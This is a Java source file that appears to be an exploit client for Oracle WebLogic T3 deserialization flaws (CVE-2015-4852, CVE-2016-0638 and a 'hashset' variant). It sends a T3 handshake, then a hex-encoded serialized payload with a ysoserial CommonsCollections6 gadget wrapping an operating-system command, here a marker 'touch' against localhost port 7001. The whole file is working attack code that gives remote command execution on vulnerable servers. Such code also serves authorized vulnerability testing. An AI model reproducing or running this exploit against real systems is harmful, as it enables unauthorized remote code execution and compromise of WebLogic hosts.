package t3;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Hex;


import java.io.*;
import java.net.Socket;

public class client {
    String yso_path;
    public static void main(String[] args) throws DecoderException, IOException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException {
        //String serverName = args[0];
        String serverName = "127.0.0.1";
        //int port = Integer.parseInt(args[1]);
        int port = 7001;
        //String vul = args[2];
        String vul = "hashset";
       // String path = args[3];
        String path = "/Users/apple-qkl/Desktop/ysoserial.jar";
        String gadget = "CommonsCollections6";
        String command = "touch /tmp/CVE_2016_0638";

        String hello = "t3 9.2.0\nAS:255\nHL:19\n\n";

        String payload1 = "000005ba016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000";
        String payload3 = "aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774b210000000000000000000d31302e3130312e3137302e3330000d31302e3130312e3137302e33300f0371a20000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d01a621b7319cc536a1000a3137322e31392e302e32f7621bb50000000078";

        byte[] payload11 = hexItr2Arr(payload1);
        byte[] payload33 = hexItr2Arr(payload3);
        byte[] payload22 = generate_payload(vul,path,gadget,command);
        byte[] leng = length(payload11.length + payload22.length+ payload33.length);
        byte[] payload = byteMerger(leng,payload11,payload22,payload33);
        try{
            Socket client = new Socket(serverName,port);
            OutputStream outToServer = client.getOutputStream();
            DataOutputStream out = new DataOutputStream(outToServer);

            out.write(hello.getBytes());
            out.flush();
            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            String versionInfo = in.readLine();
            out.write(payload);
            out.flush();

            client.shutdownOutput();
            client.close();

        }catch (IOException e){
            e.printStackTrace();
        }

    }

    public static byte[] byteMerger(byte[] bt0, byte[] bt1, byte[] bt2, byte[] bt3){
        byte[] bt4 = new byte[bt1.length+bt2.length+bt3.length];
        System.arraycopy(bt0,0,bt4,0,bt0.length);
        System.arraycopy(bt1,4,bt4,bt0.length,bt1.length-4);
        System.arraycopy(bt2,0,bt4,bt1.length,bt2.length);
        System.arraycopy(bt3,0,bt4,bt1.length+bt2.length,bt3.length);
        return bt4;
    }

    public static byte[] generate_payload(String vul_no,String path, String gadget, String command) throws IOException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException {

        switch (vul_no){
            case "CVE-2015-4852":
                return CVE_2015_4852.payload(path,gadget,command);
            case "CVE-2016-0638":
                return CVE_2016_0638.payload(path,gadget,command);
            case "hashset":
                return hashset.payload(path,gadget,command);
            default:
                return new byte[]{0};

        }


    }

    public static byte[] length(int value){
        byte[] len = new byte[4];
        len[0] = (byte) ((value >> 24) & 0xFF) ;
        len[1] = (byte) ((value >> 16) & 0xFF);
        len[2] = (byte) ((value >> 8) & 0xFF);
        len[3] = (byte) (value & 0xFF);
        return len;
    }


    public static byte[] hexItr2Arr(String hexItr) throws DecoderException{
        return Hex.decodeHex(hexItr);
    }
}
